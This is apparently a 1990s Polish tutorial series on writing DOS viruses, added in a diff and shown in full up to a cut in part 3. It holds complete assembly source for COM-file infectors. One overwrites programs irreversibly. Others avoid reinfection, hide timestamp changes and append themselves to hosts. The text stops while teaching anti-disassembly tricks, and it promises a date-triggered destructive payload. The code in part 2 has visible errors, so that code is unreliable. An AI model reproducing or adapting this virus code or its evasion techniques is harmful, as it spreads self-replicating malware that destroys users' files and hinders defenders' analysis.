@@ -1,0 +1,1413 @@
+
+Wersja 1.2P (P jak Poprawiona :-)
+                 !!! UWAGA mam problemy z ortografia !!! (*)
+
+(*) korekta MBR Labs. (ja tez nie jestem doskonaly ;-)
+
+                               CZESC 1
+                             ===========
+
+Na poczatek krotka gadka:
+  "!! UWAGA !! Nie ponosze zadnej odpowiedzialnosci za szkody spowodowane
+         jakimkolwiek praktykowaniem informacji zawartych w tym FAQ."
+
+Teraz mozna juz zaczac :-):
+
+  To jest chyba pierwsze FAQ, na temat wirusow, a dokladnie na temat pisania
+wirusow. Nie wiem, czy to sie komus przyda, czy nie. Jak ktos nie chce, to
+niech nie czyta. Nikogo nie zmuszam.
+Do nauki pisania wirusow bedzie potrzebnych kilka narzedzi:
+   - jakis kompilator asemblerowy, np. A86, czy TASM i TLINK
+   - troche czasu
+   - zly humor :-)
+   - podstawy z programowania w Assemblerze
+
+Co do kompilatora mozna go znalezc na mojej stronie: 
+                 HTTP://WWW.FREE.COM.PL/BINBOY
+Sa tam rowniez disassemblery i debuggery. POLECAM!!
+
+Zakladam, ze osoba czytajaca ten tekst, czyli np. TY masz pewne pojecie o 
+Assemblerze. Mimo, ze bede sie staral niektore rzeczy tlumaczyc dokladniej, od
+podstaw, tych, ktorzy nie maja o tym jezyku zielonego pojecia odsylam do
+przeczytania najpierw kursu programowania w Assemblerze. Bardzo dobry kurs
+znajduje sie na mojej stronie: HTTP://WWW.FREE.COM.PL/BINBOY
+
+Tekst, ktory wlasnie czytasz, jest to pierwsza czesc KURSU PISANIA WIRUSOW.
+Zajme sie w nim ogolna budowa wirusa. Znajdzie sie na koncu kod zrodlowy
+jednego takiego "INSEKTA". Kolejna wersje FAQ pojawi sie niebawem. Wszystkich
+chetnych do jej nabycia odsylam do mojej skrzynki pocztowej:
+        BINARY@POLBOX.COM lub BINBOY@FREE.COM.PL
+
+Czekam rowniez na propozycje, sugestie itp.
+
+Tekst ten mozna dowolnie kopiowac, zamieszczac na swoich stronach internetowych
+publikowac w dowolnych czasopismach, itp. Zezwalam rowniez na mala modyfikacje
+(poprawienie bledow ortograficznych, itp.:-)). Prosze tylko o zaznczenie autora
+tekstu (BY BINBOY).
+
+
+1.     ZACZYNAMY
+======================
+  Istnieje wiele wirusow. Powstaje ich coraz wiecej. Zwiazane jest to glownie
+z tym, ze na rynku powstaja coraz to nowsze programy, ktore praktycznie same
+tworza nowe "szkodniki". My jako pseudo autorzy podajemy tylko ich podstawowe
+parametry, a glownie autora. Wiekszosc programow antywirusowych potrafi wykryc
+wirusy stworzone przy pomocy takich programow. Wszystkie one maja jakies cechy
+wspolne. Jednak przez pewne rozniece w kodzie programy antywirusowe nie 
+potrafia ich usunac. Uwazam, ze takie pisanie wirusow jest do niczego. Duzo
+wiecej frajdy sprawia stworzenie takiego szkodnika, ktory nie jest wykrywany
+przez skanery, a przy okazji pokazuje jakis ciekawy efekt graficzny, badz
+dzwiekowy. 
+Wirusy doklejaja sie prawie do wszystkich plikow. Potrafia zaatakowac pliki
+typu: EXE, COM, SYS, DLL, VXD, XLS, DOC. Sa proby nawet plikow BAT. By stworzyc
+wirusa danego typu pliku trzeba poznac jego budowe. Po krotce:
+  a) pliki typu EXE posiadaja wlasny naglowek, w ktorym zapisany jest
+     punkt startu programu, czyli odkad ma ruszyc wykonywanie programu
+     po jego uruchomieniu. Wiekszosc wirusow plikow EXE dokleja sie na
+     ich koncu zapamietujac punkt startu znajdujacy sie w jego naglowku
+     i zmieniajac go na adres wlasnego kodu. Po uruchomieniu tak zara-
+     zonego pliku uruchomiony zostaje najpierw kod wirusa, a nastepnie
+     wlasciwy kod programu.
+  b) pliki typu COM sa duzo prostrze. Nie posiadaja one naglowka. Caly
+     program miesci sie w jednym segmencie, co ulatwia pisanie wirusa.
+     Programy typu COM wykonywane sa zawsze spod tego samego punktu
+     startu, jest to 100H. Dlatego wiekszosc wirusow atakujacych takie
+     pliki dopisuje sie na ich koncu zapamietujac pierwsze trzy bajty
+     orginalnego programu i zmieniajac je na instrukcje JMP adres, gdzie
+     adres - jest to poczatek kodu wirusa. 
+
+2.      PODSTAWOWE KOMENDY
+===================================
+ Na poczatek wytlumacze (przypomne) kilka komend z Assemblera, ktore
+ beda potrzebne do napisania naszego bardzo prymitywnego wirusa. Wytlumacze
+ to bardzo ogolnie i tak:
+
+   Rejestry ogolnego przeznaczenia:
+    AX - dzieli sie na AH i AL
+    BX - dzieli sie na BH i BL
+    CX - dzieli sie na CH i CL
+    DX - dzieli sie na DH i DL
+   Rejestry segmentowe:
+    CS - segment kodu
+    DS - segment danych
+  Rejestr znacznikow: do tego rejestru programista nie ma bezposredniego 
+                      dostepu, moze poszczegolne jego bity zmieniac przy
+                      pomocy innych instrukcji Assemblera.
+
+  Podstawowe komendy:
+    MOV X,Y - instrukcja kopiuje zawartosc rejestru, lub komorki pamieci X
+              do rejestru lub komorki Y. _Nie wolno_ kopiowac komorki pamieci
+              do komorki pamieci. Jako X mozemy rowniez podac wartosc stala.
+              _Nie wolno_ przesylac wartosci stalej do rejestru segmentowego.
+   INT X    - instrukcja powoduje wywolanie przerwania o numerze X
+   JMP X    - instrukcja powoduje wykonanie skoku bezwarunkowego pod adres X
+   XCHG X,Y - instrukcja powoduje zamiane miedzy soba wartosci dwoch rejestrow.
+   XOR X,Y  - rozkaz oblicza sume symetryczna rejestrow X i Y. Jesli wykonamy
+              ta instrukcje na tych samych rejestrach, to zostana one 
+              wyzerowane, np. XOR AX,AX (AX=0)
+
+ Do napisania pierwszego wirusa beda nam potrzebne rowniez pewne przerwania:
+   
+  INT 21H     - przerwanie 21H (wywolanie funkcji DOS-u)
+  MOV AH,x    - X - numer funkcji przerwania
+
+     AH=4EH - funkcja powoduje szukanie pliku w katalogu biezacym o nazwie,
+              do ktorej adres podany jest w DS:DX. W nazwie tej mozna
+              uzywac gwiazdek i znaku zapytania. W rejestrze CX podajemy
+              atrybut szukanego pliku. Jesli plik zostanie znaleziony
+              znacznik C zostanie wyzerowany, w DTA bedzie znajdowal sie
+              opis znalezionego pliku. Jesli wystapi blad znacznik C bedzie
+              ustawiony (=1), a w rejestrze AX bedzie kod powstalego bledu.
+              Blok DTA zaczyna sie od adresu 80H i ma nastepujaca budowe:
+                 OFFSET   ROZMIAR          ZAWARTOSC
+                   0H       15H        Zarezerwowane dla funkcji 4FH
+                  15H        1H        Atrybuty
+                  16H        2H        Czas ostatniej modyfikacji
+                  18H        2H        Data ostatniej modyfikacji
+                  1AH        4H        Rozmiar pliku w bajtach
+                  1EH       0DH        Nazwa pliku
+             Tak wiec nazwa znalezionego pliku znajduje sie pod adresem 9EH.
+    AH=4FH - funkcja powoduje szukanie kolejnego pliku. Jesli nie zostanie
+             znaleziony znacznik C zostanie ustawiony
+    AH=3DH - funkcja powoduje otwarcie pliku. W DS:DX podajemy adres nazwy
+             pliku w kodzie ASCIIZ, czyli nazwa musi byc zakonczona kodem ASCII
+             0, a w AL podajemy tryb dostepu. Mamy do dyspozycji:
+                  AL=0 - tylko do odczytu
+                  AL=1 - tylko do zapisu
+                  AL=2 - do odczytu i zapisu
+             Jesli powstanie jakis blad podczas otwierania pliku zostanie 
+             ustawiony znacznik C, w przeciwnym razie w rejestrze AX znajdowac
+             sie bedzie numer dojscia do pliku.
+    AH=3EH - funkcja powoduje zamkniecie dojscia do pliku. Pliki trzeba zamknac
+             by wprowadzone zmiany zostaly zachowane. W rejestrze BX podajemy
+             numer dojscia do pliku, ktory chcemy zamknac.
+    AH=40H - funkcja powoduje zapisanie CX bajtow do pliku zwiazanego z 
+             dojsciem podanym w BX. Zapisane zostana bajty zaczynajac od adresu
+             DS:DX.
+    AH=42H - funkcja powoduje ustalenie pozycji wskaznika w pliku. W rejestrze
+             BX podajemy numer dojscia do naszego pliku, w CX:DX adres 
+             przesuniecia, a w AL sposob przesuniecia. Mamy trzy rodzaje
+             przesuniec:
+                  AL=0 - wzgledem poczatku pliku
+                  AL=1 - wzgledem aktualnej pozycji wskaznika w pliku
+                  AL=2 - wzgledem konca pliku
+             Po wykonaniu przerwania w DX:AX znajduje sie aktualna pozycja
+             kursora. Jesli wiec chcemy ustawic kursor na koncu pliku rejestry
+             CX i DX beda rowne zero, a przesuniecie bedzie wzgledem konca
+             pliku (AL=2). Funkcja ta to takze sposob na odczytanie dlugosci
+             pliku. Wywolana z AL=2, CX=DX=0 zwroci w DX:AX dlugosc pliku.
+
+3.    TO DO DZIELA
+==========================
+
+Pierwszym naszym wirusem bedzie wirus o nazwie TINY. Zajmuje on tylko 
+32 bajty. Dokleja sie on na poczatku pliku COM zamazujac orginalny kod. Tak
+zarazonych plikow nie da sie juz odzyskac.
+
+  Nasz wirus bedzie wykonywal nastepujace czynnosci:
+     1. szuka pliku do zarazenia
+     2. otwiera znaleziony plik
+     3. zapisuje samego siebie
+
+Wirus wiec wyglada tak:
+
+Start:                 ; poczatek wirusa
+   MOV AH,4EH          ; szukanie pliku
+   MOV DX,OFFSET Maska ; z rozszerzeniem COM
+   INT 21H
+   MOV AX,3D02H        ; otwarcie pliku
+   MOV DX,09EH         ; nazwa znalezionego pliku z bloku DTA
+   INT 21H
+   XCHG AX,BX          ; do BX numer dojscia
+   MOV AH,40H          ; pisanie w pliku
+   MOV CL,20H          ; CL=20H --> CL=32 - dlugosc zapisywanego pliku
+   MOV DX,OFFSET Start ; poczawszy od poczatku wirusa
+   INT 21H
+   RET                 ; zakonczenie programu
+   Maska DB "*.COM",0  ; szukany plik   
+
+Jest to bardzo prymitywny wirus. Nie wyswietla zadnego napisu. Zarazone pliki
+zmieniaja swoja date oraz czas ostatniej modyfikacji. Wirus rowniez nie zarazi
+pliku, ktory ma nalozone jakies atrybuty. Jednak program powyzszy mozna nazwac
+WIRUSEM, gdy potrafi sie rozprzestrzeniac.
+Mozna w pewien sposob poprawic naszego wirusa dostawiajac na jego koncu napis
+np. "Out of memory", tak by po zarazeniu pliku napis ten zostal wyswietlony.
+Powinno to zmylic potencjalnego uzytkownika i skusic do powtorzenia tej 
+operacji. Wirusy tego typu maja jedna zalete. Zarazane programu nie zmieniaja
+swojej objetosci.
+
+Jest jeszcze jeden wirus o nazwie TRIVIAL.127. Jest to poprawiona wersja 
+naszego TINY'ego. Czym ona sie rozni ?:
+  - Nie zaraza plikow wczesniej zarazonych
+  - Kontroluje ewentualne bledy
+  - Pliki nie zmieniaja swojej daty i czasu ostatniej modyfikacji
+Zastanowmy sie jak zrobic poszczegolne te elementy.
+
+ Nasz wirus musi byc troche bardziej inteligentny i jesli znajdzie plik, ktory
+ zostal wczesniej juz zarazony, to niech go nie zaraza jeszcze raz tylko 
+ poszuka kolejnej ofiary. By to uczynic musi jakos przetestowac znaleziony plik
+ i stwierdzic, w nim obecnosc swojego kodu badz nie. 
+ W wirusie TRIVIAL.127 posluzono sie w tym celu pierwszymi dwoma bajtami. 
+ Caly wirus zaczyna sie od instrukcji MOV BX,BX, ktora ma kod  8BDB. Teraz
+ po znalezieniu ofiary, zostaja sprawdzone jej dwa pierwsze bajty i jesli to
+ 8BDB, to szukamy drugiego pliku, a jesli nie to zarazamy. By uczynic powyzsze
+ zadanie przypone kilka instrukcji, ktore beda nam potrzebne:
+    CMP X,Y  - instrukcja powoduje porownanie dwoch rejestrow, badz rejestru i
+               stalej oraz na podstawie wyniku odpowiednie ustawienie 
+               znacznikow.
+    JC adres - jest to skok warunkowy. Jesli znacznik C jest ustawiony (=1) to
+               zostanie wykonany skok pod wskazany adres.
+    JE adres - skok gdy wartosci rejestrow X i Y sa takie same (X=Y)
+    JNE adr  - skok gdy wartosci X i Y sa rozne (X!=Y lub X<>Y)
+    PUSH rej - instrukcja powoduje zapamietanie na stosie wartosci rejestru REJ
+    POP rej  - instrukcja powoduje zdjecie ze stosu wartosci i zapamietanie jej
+               w rejestrze REJ.
+    CALL adr - instrukcja powoduje skok do procedury, ktora musi byc zakonczona
+               instrukcja RET
+    RET      - powoduje powrot z procedury do  miejsca, z ktorego zostala 
+               wywolana.
+
+  Bedzie rowniez potrzebnych kilka przerwan (funkcji):
+    INT 21H  - przerwanie 21H
+    MOV AL,X - X - numer funkcji
+
+       AH=3FH - funkcja powoduje czytanie pliku. W rejestrze BX podajemy numer
+                dojscia do pliku, w CX liczbe czytanych bajtow, a w DS:DX adres
+                bufora, gdzie zostana zapamietane dane. Jesli wystapi podczas
+                operacji jakis blad, to zostanie ustawiony znacznik C, a 
+                rejestr AX bedzie zawieral kod powstalego bledu. Jesli 
+                natomiast operacja zakonczy sie sukcesem, to w AX bedzie 
+                zapisana liczba przeczytanych bajtow.
+                
+       AH=57H - funkcja ustawia lub sprawdza aktualna date oraz czas ostatniej
+                modyfikaji. Jesli AL=0 to sprawdzamy, a wtedy podajemy w BX
+                numer dojscia i po wykonaniu przerwania w CX znajduje sie czas,
+                a w DX data modyfikacji. Gdy AL=1 to ustawiamy, wtedy podajemy
+                rowniez w BX numer dojscia i w CX czas, a DX date modyfikacji.
+
+       AH=4CH - funkcja powoduje zakonczenie wykonywania programu i zwrocenie
+                wartosci podanej w AL przez ten program.
+
+Nasz wirus wiec wyglada tak:
+
+Start:                          ; poczatek kodu wirusa
+         MOV   BX,BX            ; instrukcja charakterystyczna dla wirusa
+         MOV   AH,4EH           ; szukanie pliku
+         MOV   CX,0             ; ustalenie atrybutow szukanego pliku
+         MOV   DX,OFFSET Maska  ; nazwa szukanego pliku (*.COM)
+Etyk1:
+         INT   21H
+         JC    Etyk2            ; jesli nie znaleziono pliku, to skok pod ETYK2
+         CALL  Proc1            ; jesli znaleziono, to infekcja - skok to PROC1
+         MOV   AH,4FH           ; szukanie nastepnego
+         JMP   Etyk1            ; skok na poczatek ETYK1
+Etyk2:                                                     
+         MOV   AX,4C00H         ; zakonczenie programu
+         INT   21H
+Proc1:                          ; procedura zaraza plik
+         MOV   AX,3D02H         ; otwarcie pliku do odczytu i zapisu
+         MOV   DX,9EH           ; nazwa w bloku DTA, czyli adres 9EH
+         INT   21H
+         XCHG  BX,AX            ; do BX numer dojscia do pliku
+         MOV   AH,3FH           ; czytanie z pliku
+         MOV   CX,2             ; dwoch pierwszych bajtow
+         MOV   DX,OFFSET Bufor  ; i zapamietanie ich w Buforze
+         INT   21H
+         CMP   WORD PTR Bufor, 08BDBH ; jesli wczytane bajty to 8BDB
+         JE    Etyk4            ; tzn. ze plik zostal juz zarazony
+         XOR   DX,DX            ; wyzerowanie rejestru DX
+         MOV   CX,DX            ; do CX wartosc DX, czyli CX=0
+         MOV   AX,4200H         ; ustawienie wskaznika na poczatku pliku
+         INT   21H
+         MOV   AL,0             ; AL=0, czyli
+         MOV   AH,57H           ; sprawdzenie daty i czasu ostatniej 
+         INT   21H              ; modyfikacji
+         PUSH  CX               ; zapamietanie czasu
+         PUSH  DX               ; i daty na stosie
+         MOV   AH,40H           ; zapisanie w pliku
+         MOV   CX,OFFSET Koniec-OFFSET Start  ; dlugosc_wirusa bajtow
+         MOV   DX,100H          ; poczawszy od adresu 100H (poczatek kodu)
+         INT   21H
+         MOV   AL,1             ; AL=1
+         POP   DX               ; zdjecie ze stodu daty i
+         POP   CX               ; czasu ostatniej modyfikacji
+         MOV   AH,57H           ; zmiana owych parametrow pliku, gdyz AL=1
+         INT   21H              
+Etyk4:
+         MOV   AH,3EH           ; zamkniecie dojscia do pliku
+         INT   21H                                          
+         RET                    ; powrot z procedury
+Bufor    DW 0                   ; bufor
+Maska    DB "*.COM",0           ; nazwa szukanego pliku
+
+
+To tyle na dzis :-)). Niedlugo pokaze sie kolejna czesc z cyklu KURS PIANIA
+WIRUSOW. Bedziemy sie jeszcze zajmowac plikami COM. Nasz wirus bedzie juz 
+bardziej inteligentnym programem. Nie bedzie niszczyl zbioru, a jedynie
+doklejal sie na jego koncu. 
+
+
+                               CZESC 2
+                             ===========
+
+Mozesz zamknac na chwile oczy i szybko to przeczytac:
+  "!! UWAGA !! Nie ponosze zadnej odpowiedzialnosci za szkody spowodowane
+         jakimkolwiek praktykowaniem informacji zawartych w tym FAQ."
+
+Mozesz juz otworzyc oczy, PRZESZLO :-))
+
+  Witam w kolejnej czesci FAQ poswieconemu WIRUSOM. Jest to pewnego rodzaju
+KURS PISANIA WIRUSOW. Jesli to czytasz, tzn. ze spodobala Ci sie pierwsza czesc
+z tego cyklu. Jesli jej nie przeczytales, to lepiej przeczytaj. Mozesz ja
+znalezc na HTTP://WWW.FREE.COM.PL/BINBOY lub w mojej skrzynce pocztowej.
+
+Niedlugo pojawi sie kolejna czesc tego FAQ. Wszystkich chetnych zapraszam do
+jej nabycia. Kiedy sie pojawi nie wiem. 
+
+Tekst ten mozna dowolnie kopiowac, zamieszczac na swoich stronach internetowych
+publikowac w dowolnych czasopismach, itp. Zezwalam rowniez na mala modyfikacje
+(poprawienie bledow ortograficznych, itp.). Prosze tylko o zaznczenie autorstwa
+tekstu, czyli dodanie napisu BY BINBOY.
+
+
+1.     ZACZYNAMY
+======================
+  W tym FAQ zajmiemy sie jeszcze wirusami plikow COM. Znamy juz budowe takiego
+pliku. Wiemy jak one dzialaja. Potrafimy rowniez wykonac podstawowe operacje w
+Assemblerze, tzn. dopisywac sie do pliku, odczytywac plik, szukac pliku,
+zmieniac jego date i czas ostatniej modyfikacji i wiele innych. Jednak nasze
+dotychczas napisane wirusy byly malo efektowne. Uszkadzaly trwale moze bardzo
+wazne dane. Chyba nie oto nam chodzilo, nie :-), ale uwazam, ze taki wstep
+do pisania wirusow jest bardzo dobry. Teraz nauczymy sie dopisywania do innych
+programow bez ich nie uszkadzania. Do tego celu posluze sie wirusami 
+wygenerowanymi przez program IVP. Sa one bardzo przejrzyste i proste. Nie
+doradzam nikomu tworzenia wirusow tym programem, gdyz sa one niesamodzielne,
+ale zachecam do przestudiowania algorytmu programu IVP.
+
+
+2.    KILKA KOMEND
+=========================
+Zanim zaczniemy pisac wirusa przypomne kilka komend, ktore beda potrzebne do
+jego stworzenia:
+
+   MOVSB,MOVSW - instrukcja kopiuje  do komorki ES:DI wartosc  komorki DS:SI
+                 oraz zmniejsza DI i SI o rozmiar komorki, jesli znacznik D
+                 jest ustawiony lub zwieksza gdy D jest wyzerowany.
+   LEA rej,adr - instrukcja oblicza offset adresu drugiego argumentu i
+                 zapamietuje go w pierwszym operandzie.
+   SUB X,Y     - instrukcja powoduje odjecie wartosci rejestru lub stalej
+                 Y od X i zapamietanie wyniku w rejestrze X
+
+
+3.    DO ROBOTY
+=====================
+Zastanowmy sie, jak ma dzialac nasz wirus. Powinien wykonywac on kilka krokow:
+     a)  Odnalezc plik do infekcji
+     b)  Sprawdzic, czy czasem nie jest juz on zainfekowany
+     c)  Dokleic sie na jego koncu
+     d)  Zapamietac jego trzy pierwsze bajty
+     e)  Zmodyfikowac te pierwsze bajty tak, by wskazywaly na kod wirusa
+
+Dopisywanie wirusa jest bardzo proste, jest jednak pewna pulapka, na ktora
+wszyscy poczatkujacy sie lapia. Nie wolno podawac adresow stalych, np. nie
+mozna przy fynkcji wyszukujacej plik podac nazwe tego pliku jako np.
+    MOV DX,OFFSET Maska
+Kompilator asemblerowy kompilujac ta instrukcje "OFFSET Maska" zamieni na
+stala wskazujaca na zmienna Maska, np. 10H. Teraz jesli wirus dopisze sie do
+pliku o wielkosci np. 100H, to pod adresem 10H bedzie znajdowal sie kod 
+programu, a nie nazwa. Nazwa szukanego pliku bedzie znajdowala sie pod adresem
+110H. Nasuwa sie teraz pytanie. Skad mozemy wiedziec ile trzeba dodac ?
+Odpowiedz jest prostsza pewnie niz myslisz. Do tego celu trzeba posluzyc sie
+instrukcja CALL. Po wykonaniu instrukcji CALL na stos zostaje polozony adres
+aktualnie wykonywanej komendy (IP), a dokladniej komendy, od ktorej ma byc
+dalej wykonywany program, po to by po instrukcji RET procesor wiedzial dokad ma
+skoczyc (wrocic). Jesli wiec napiszemy:
+            CALL Etyk1
+     Etyk1: POP  AX
+To w rejestrze AX znajdzie sie adres (IP) aktualnie wykonywanego rozkazu (czyli
+OFFSET Etyk1). Jesli juz wiemy ile mamy dodawac do kazdego adresu napisanie
+wirusa jest bardzo proste. Po zdjeciu ze stosu IP musimy go jednak gdzies 
+zapisac. Mozna to zrobic w jakiejs zmiennej, ale to bardzo skomplikuje kod
+wirusa, a mozna tez zapamietac go w rejestrze BP. Rejestr ten nie jest
+zmieniany przez zadna funkcje i dopoki sami nie zmienimy jego wartosci bedzie
+zawieral adres punktu startu.
+
+4.      WIRUSSS
+======================
+Przejdzmy do rzeczy. Ponizej znajduje sie kod wirusa wygenerowanego przez 
+program IVP i zmodyfikowanego przeze mnie tak by byl prostszy. Przejrzyj go
+dokladnie. Zostal on wzbogacony komentarzami by ulatwic jego zrozumienie.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-POCZATEK=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+         CODE SEGMENT PUBLIC 'CODE'
+         ASSUME CS:CODE
+         ORG 100H
+Start:
+           DB     0E9H,2,0                       ; skok do nastepnej komendy
+           DW     'XX'                           ; identyfikator pliku
+Virus:     
+           CALL   RealCode                       ; skok do RealCode
+RealCode:                                        
+           POP    BP                    ; zdjecie IP ze stosu
+           SUB    BP,3                  ; 3 to dlugosc instrukcji CALL RealCode
+                                        ; teraz mamy w rejestrze BP wartosc,
+                                        ; ktora musimy dodawac do kazdego z
+                                        ; adresow
+           LEA    SI,OFFSET [BP+OldJump]         ; do SI adres OldJUMP
+           MOV    DI,100H                        ; do DI adres 100H
+           PUSH   DI                             ; na stos wartosc 100H
+                                                 ; by zadzialala instrukcja RET
+           MOVSB                                 ; przekopiowanie bajtu
+           MOVSW                                 ; i jeszcze dwoch bajtow
+           MOVSW                                 ; i kolejne dwa bajy
+                                                 ; z SI do DI.Teraz na poczatku
+                                                 ; programu znajduje sie jego
+                                                 ; oryginalny KOD
+           MOV   [BP+Counter],BYTE PTR 0         ; wyzerowanie licznika zarazen
+           LEA   DX,[BP+OFFSET ComFileSpec]      ; do DX nazwa szukanego pliku
+           CALL  FindFirst                       ; szukanie i zrazenie pliku
+           RET                                   ; powrot pod 100H i wykonanie
+                                                 ; oryginalneg programu
+FindFirst:                                       ; szukanie pliku
+           CMP   [BP+Counter],5                  ; jesli zainfekowane 
+           JA    Quit                            ; wiecej niz 5 plikow to QUIT
+           MOV   AH,4EH                          ; szukanie pliku
+           MOV   CX,7                            ; z dowolnymi atrybutami
+FindNext:  
+           INT   21H
+           JC    Quit                            ; jesli nie znaleziono,to QUIT
+           CALL  Infection                       ; jesli znaleziono,to infekcja
+FindNext2:
+           MOV   AH,4FH                          ; szukanie kolejnej ofiary :-)
+           JMP   FindNext
+Quit:            
+           RET   
+
+Infection:                                       ; infekcja zbioru
+           MOV   AL,0H                           ; do AL 0, czyli
+           CALL  Open                            ; otwarcie zbioru tylko do 
+                                                 ; odczytu
+           MOV   AH,3FH                          ; przeczytanie
+           MOV   CX,1AH                          ; 1A bajtow
+           LEA   DX,[BP+OFFSET Buffer]           ; i zapamietanie ich w buforze
+           INT   21H
+           MOV   AH,3EH                          ; zamkniecie pliku
+           INT   21H
+CheckCOM:
+           MOV   BX,WORD PTR [BP+80H+1AH]        ; do BX wielkosc zbioru z 
+                                                 ; bloku DTA
+           CMP   WORD PTR CS:[BP+Buffer+3],'XX'  ; jesli 4 i 5 bajt zbioru 
+                                                 ; to XX
+           JE    QuitInfect                      ; tzn. ze jest on juz zarazony
+                                                 ; wiec koniec infekcji
+           JMP   InfectCOM                       ; skok do INFECTCOM
+QuitInfect:
+           RET
+
+InfectCOM:
+           SUB   BX,3                            ; zmniejszenie wielkosci 
+                                                 ; zbioru o 3, bo tyle zajmuje
+                                                 ; polcenie JMP
+           LEA   SI,[BP+Buffer]                  ; do SI adres bufora
+           LEA   DI,[BP+OldJump]                 ; do DI adres OLDJUMP
+           MOVSB                                 ;\ / przekopiowanie trzech 
+           MOVSW                                 ;-   pierwszych bajtow pliku
+           MOVSW                                 ;/\  do zmiennej OLDJUMP
+           MOV   [BP+Buffer],BYTE PTR 09EH       ; zamiana pierwszego bajtu w 
+                                                 ; buforze na 9E, czyli JMP
+           MOV   WORD PTR [BP+Buffer+1],BX       ; dalej zapisanie wielkosci
+                                                 ; zbioru.
+           MOV   WORD PTR [BP+Buffer+3],'XX'     ; za tym wszystkim w 4 i 5
+                                                 ; bajcie zapisanie XX, czyli
+                                                 ; identyfikator zarazenia
+FinishInfection:
+
+           MOV   AL,2                            ; AL=2 czyli
+           CALL  Open                            ; otwarcie zbioru do odczytu i zapisu
+           MOV   AH,40H                          ; zapisanie w pliku
+           LEA   DX,[BP+Buffer]                  ; z bufora
+           MOV   CX,5                            ; 5 bajtow
+           INT   21H
+           JC    CloseFile                       ; jesli blad, to zamknij plik
+           MOV   AL,2                            ; AL=2, czyli
+           CALL  Move_fp                         ; ustawienie wskaznika na 
+                                                 ; koniec pliku
+           MOV   AH,40H                          ; zapisanie
+           MOV   CX,EOF-Virus                    ; (koniec - poczatek) bajtow
+           LEA   DX,[BP+OFFSET Virus]            ; poczawszy od poczatku wirusa
+           INT   21H
+           INC   [BP+Counter]                    ; zwiekszenie licznika 
+                                                 ; zarazonych zbiorow
+CloseFile: 
+           MOV   AH,3EH                          ; zamkniecie dojscia do pliku
+           INT   21H
+           RET
+
+Move_fp:                                         ; zmiana polozenia wskaznika
+           MOV   AH,42H                          ; w pliku
+           XOR   CX,CX
+           XOR   DX,DX
+           INT   21H
+           RET
+Open: 
+           MOV   AH,3DH                          ; otwarcie pliku
+           MOV   DX,9EH
+           INT   21H
+           XCHG  AX,BX
+           RET
+ComFileSpec DB "*.COM",0                         ; szukany plik
+OldJump     DB 0CDH,020H,0,0,0                   ; zapamietane 3-pierwsze bajty
+
+EFO         EQU $
+
+      ; zapisywana jest czesc wirusa az do EOF. Zmienne ponizej nie sa
+      ; zapisywane w pliku, gdyz tylko zwiekszylyby jego objetosc, a
+      ; ich wartosci nie sa wazne
+
+Counter     DB 0                                 ; licznik zarazen
+Buffer      DB 01AH DUB (?)                      ; bufor
+
+EOV         EQU $
+END START
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-KONIEC=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Wirus ten jest bardzo prosty i ma pewne bledy. Jego ofiary zmieniaja swoja
+date i czas ostatniej modyfikacji. Mozna go o to wlasnie udoskonalic. 
+
+
+
+
+Na razie to wszystko. W kolejnej czesci tego FAQ zajme sie jeszcze plikami COM.
+Udoskonalimy kod naszego wirusa. Dodamy procedure destrukcyjna, ktora uruchomi
+sie konkretnego dnia. Zabezpieczymy rowniez naszego wirusa przed ogladaniem go
+disassemblerami i probami jego debuggowania.
+
+
+                               CZESC 3
+                             ===========
+
+  "!! UWAGA !! Nie ponosze zadnej odpowiedzialnosci za szkody spowodowane
+         jakimkolwiek praktykowaniem informacji zawartych w tym FAQ."
+
+
+  Witam w kolejnej czesci FAQ poswieconemu WIRUSOM. Przypominam, ze FAQ to,
+jest pewnego rodzaju kursem pisania wirusow. Jest to juz 3 czesc z tego
+cyklu. Od tej czesci wspolautorem FAQ jest MBR.
+
+  Wszystkich, ktorzy maja jakies pytania dotyczace wirusow lub dotyczace tego
+FAQ odsylam do skrzynki pocztowej.
+               BINBOY@FREE.COM.PL lub BINARY@POLBOX.COM
+Jesli jestes zainteresowany nabyciem kolejnej czesci z tego cyklu, to rowniez
+odsylam do skrzynki.
+
+Tekst ten mozna dowolnie kopiowac, zamieszczac na swoich stronach internetowych
+publikowac w dowolnych czasopismach, itp. Zezwalam rowniez na mala modyfikacje
+(poprawienie bledow ortograficznych, itp.). Prosze tylko o zaznczenie autorstwa
+tekstu, czyli dodanie stopki BY BINBOY & MBR.
+
+
+1.     WSTEP
+======================
+  Wedle obietnicy w tym FAQ zajmiemy sie udoskonalaniem naszego kodu. Jego
+optymalizacja, zabezpieczaniem przed debuggerami i disassemblerami oraz
+dodamy ciekawa procedure destrukcyjna.
+
+
+2.    DISASSEMBLERY
+=======================
+   Disassemblery sa to programy, ktore umozliwiaja edycje naszego programu w
+kodzie zrodlowym, w assemblerze. Istnieja roznego rodzaju disassemblery. Jedne
+sa bardziej, inne mniej inteligentne. Kilka takich mozesz sciagnac ze strony
+     HTTP://WWW.FREE.COM.PL/BINBOY
+Jak one dzialaja? Te mniej inteligentne posiadaja po prostu zbior komend i 
+im odpowiadajacych kodow procesora. Nastepnie prosto z gory na dol przetwarzaja 
+program wedle swojej  bazy. Mozna w bardzo prosty sposob oszukac takie 
+disassemblery wykorzystujac taka wlasciwosc procesora, ze ta sama liczba moze 
+byc jakims rozkazem, ale i moze byc rowniez dana przekazywana do innego 
+rozkazu. Zobaczmy to na przykladzie. Mamy program:
+
+    MOV DX,OFFSET Napis
+    MOV AH,09H
+    INT 21H
+    RET
+    Napis DB "BINBOY & MBR",13,10,'$'
+
+Po skompilowaniu go kompilatorem A86 powstanie maly program, ktory wyswietla
+pewien napis. Jednak program ten mozna bardzo latwo disassemblowac. Uzyjemy
+dowolnego tego typu programu, np. HIEW i otrzymamy zrodlo. Na HIEW-a i inne
+malo inteligentne programy jest pewien bardzo prosty sposob. Zobaczmy:
+
+     JMP ET2
+     DB 05H
+ET2: MOV DX,OFFSET Napis
+     MOV AH,09H
+     INT 21H
+     RET
+     Napis DB "BINBOY & MBR",13,10,'$'
+
+Powyzszy program jest zabezpieczony przed disassemblacja. Taka proba dala by
+w efekcie nastepujacy wynik (disassemblowano HIEW-em) :
+
+   JMP 04H
+   ADD AX,00CBA
+   ADD [SI][0CD09],SI
+   AND BX,AX
+   INC DX
+   DEC CX
+   DEC SI
+   INC DX
+   DEC DI
+   AND [04D20],AH
+   INC DX
+   PUSH DX
